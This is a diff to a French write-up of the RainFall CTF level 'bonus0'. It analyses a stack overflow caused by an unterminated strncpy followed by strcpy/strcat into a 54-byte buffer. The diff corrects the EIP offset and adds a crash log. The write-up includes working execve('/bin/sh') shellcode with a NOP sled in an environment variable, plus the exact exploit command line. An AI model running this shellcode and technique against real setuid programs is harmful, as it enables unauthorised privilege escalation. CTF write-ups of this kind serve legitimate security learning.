@@ -7,12 +7,24 @@
 
 ## 2) Analyse & vulnérabilité
 - Analyse statique :
-	- `p` fait `strncpy(..., 0x14)` sans ajouter de `\0` si l’entrée fait 20 caractères.
-	- `pp` copie deux buffers de 20 octets collés, puis fait `strcpy` et `strcat`.
+	- `p` fait `strncpy(<entrée standard>, 0x14)` sans ajouter de `\0` si l’entrée fait 20 caractères.
+	- Buffer cible : `str[54]` dans `main`.
+	- `pp` execute 2 fois p() dans 2 buffer collés dans la stack, puis lance `strcpy(str[54], buf1)` sauf que vu que buf1 n'est pas null terminated, la string buf1 + buf 2 est copiée. un espace est ensuite ajouté puis buf2 est concaténé à str[54].
 	- Taille copiée : `20 + 20 + 1 + 20 = 61` octets.
-	- Buffer cible : `char local_3a[54]` dans `main`.
 - Analyse dynamique :
-	- EIP est écrasé à l’offset 10 du deuxième input.
+	- EIP est écrasé à l’offset 9 du deuxième input (si le buf1 a 20 char) à cause du buffer overflow de pp.
+	```sh
+	./bonus0
+	 - 
+	AAAAAAAAAAAAAAAAAAAA
+	 - 
+	BBBBCCCCDDDDEEEEFFFF
+	AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFF��� BBBBCCCCDDDDEEEEFFFF���
+	Segmentation fault (core dumped)
+	bonus0@RainFall:~$ dmesg | grep segfault
+	[   95.861733] bonus0[2702]: segfault at fff51e42 ip fff51e42 sp bffff350 error 15
+	[  201.947993] bonus0[2713]: segfault at 45444444 ip 45444444 sp bffff350 error 14
+```
 - Vulnérabilité : overflow du buffer de `main`.
 
 ## 3) Exploitation & flag
@@ -23,4 +35,4 @@
 - Commandes utilisées :
 	- `export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')`
 	- `echo 'int main() { printf("0x%x\n", getenv("SHELLCODE")); }' > /tmp/find.c && gcc /tmp/find.c -o /tmp/find && /tmp/find`
-	- `(python -c 'print "A"*20'; python -c 'print "B"*10 + "\x42\xff\xff\xbf" + "C"*6'; cat) | ./bonus0`
+	- `(python -c 'print "A"*20'; python -c 'print "B"*9 + "\x42\xff\xff\xbf" + "C"*7'; cat) | ./bonus0`
